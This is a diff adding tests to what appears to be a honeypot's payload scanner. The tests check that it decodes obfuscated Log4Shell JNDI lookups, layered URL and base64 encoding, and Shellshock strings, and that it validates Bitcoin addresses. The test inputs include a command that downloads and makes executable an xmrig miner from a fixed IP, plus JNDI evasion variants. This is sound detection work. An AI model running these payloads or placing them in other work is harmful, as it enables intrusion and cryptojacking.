@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import base64
 import dataclasses
+import hashlib
 import sys
 from pathlib import Path
 
@@ -92,6 +93,72 @@ def test_payload_extraction() -> None:
           not hunt.scan_payload("the scheduler blocks until the lease expires").any())
     check("empty payload is safe", not hunt.scan_payload("").any())
     check("as_dict is serialisable", isinstance(found.as_dict()["wallets"], dict))
+
+
+def test_scanner_upgrades() -> None:
+    print("\nscanner: decoding and evasion")
+    from urllib.parse import quote
+
+    def jndi(text):
+        return hunt.scan_payload(text).jndi
+
+    check("${lower:j}ndi deobfuscated", jndi("${${lower:j}ndi:ldap://x.test/a}") == ["${jndi:ldap://x.test/a}"],
+          str(jndi("${${lower:j}ndi:ldap://x.test/a}")))
+    check("${::-j}${::-n}di deobfuscated",
+          jndi("${${::-j}${::-n}${::-d}${::-i}:rmi://x.test/a}") == ["${jndi:rmi://x.test/a}"])
+    check("${env:X:-j} defaults deobfuscated",
+          jndi("${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.test/a}")
+          == ["${jndi:ldap://x.test/a}"])
+    check("upper-case lookup", jndi("${jNdI:LDAP://x.test/a}") != [])
+    check("obfuscation is flagged", hunt.scan_payload("${${lower:j}ndi:ldap://x.test/a}").jndi_obfuscated)
+    check("plain jndi is not flagged obfuscated", not hunt.scan_payload("${jndi:ldap://x.test/a}").jndi_obfuscated)
+    check("url-encoded jndi found", jndi("%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D") == ["${jndi:ldap://x.test/a}"])
+
+    stratum = "stratum+tcp://pool.example.test:3333"
+    triple = quote(quote(quote(stratum, safe=""), safe=""), safe="")
+    found = hunt.scan_payload("cfg=" + triple)
+    check("triple url-encoding peeled", any(stratum in p for p in found.pools), triple)
+    check("url layers counted", found.url_decoded_layers == 3, str(found.url_decoded_layers))
+
+    inner = b"wget http://45.9.148.99/xmrig -O /tmp/x && chmod +x /tmp/x"
+    twice = base64.b64encode(base64.b64encode(inner)).decode()
+    found = hunt.scan_payload("x=" + twice)
+    check("base64 decoded two layers deep", "xmrig" in found.miners and found.decoded_layers == 2,
+          f"{found.miners} {found.decoded_layers}")
+
+    check("shellshock marker", hunt.scan_payload("() { :; }; /bin/bash -c id").shellshock)
+    check("shellshock with odd spacing", hunt.scan_payload("()  {  _; } >_[$($())] { echo x; }").shellshock)
+    check("ordinary parentheses are not shellshock", not hunt.scan_payload("f() returns {a}").shellshock)
+
+
+def test_wallet_validation() -> None:
+    print("\nscanner: wallet checksums")
+    valid = [
+        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",                             # P2PKH (genesis)
+        "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",                             # P2SH (BIP13)
+        "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4",                     # P2WPKH (BIP173)
+        "bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297",  # P2TR (BIP350)
+    ]
+    for address in valid:
+        got = hunt.scan_payload(f"pay {address} now").wallets.get("bitcoin")
+        check(f"valid {address[:6]}... accepted", got == [address], str(got))
+    mutated = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"
+    check("base58check typo rejected", not hunt.scan_payload(mutated).wallets)
+    check("bech32 typo rejected", not hunt.scan_payload("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t5").wallets)
+    etag = '"1a2b3c4d5e6f7a8b9c1d2e3f4a5b6c7d"'
+    check("hex etag is not a bitcoin address", not hunt.scan_payload(etag).wallets)
+    from mirage_crawl import beacons
+    noisy = sum(
+        1 for i in range(3000)
+        if hunt.scan_payload(policies_trap(beacons.mint(b"n" * 32, "robots", f"10.0.{i // 250}.{i % 250}", "ua"))).wallets
+    )
+    check("beacon trap paths never look like wallets", noisy == 0, f"{noisy}/3000")
+    hexes = sum(1 for i in range(3000) if hunt.scan_payload(f'"{hashlib.blake2s(str(i).encode(), digest_size=16).hexdigest()}"').wallets)
+    check("ETag-style hex never looks like a wallet", hexes == 0, f"{hexes}/3000")
+
+
+def policies_trap(token: str) -> str:
+    return f"/internal/notes/{token}/handover.html"
 
 
 def test_ja4_computation() -> None:
@@ -213,6 +280,8 @@ def test_request_rewriter() -> None:
 if __name__ == "__main__":
     test_probe_matching()
     test_payload_extraction()
+    test_scanner_upgrades()
+    test_wallet_validation()
     test_ja4_computation()
     test_request_rewriter()
     if failures:
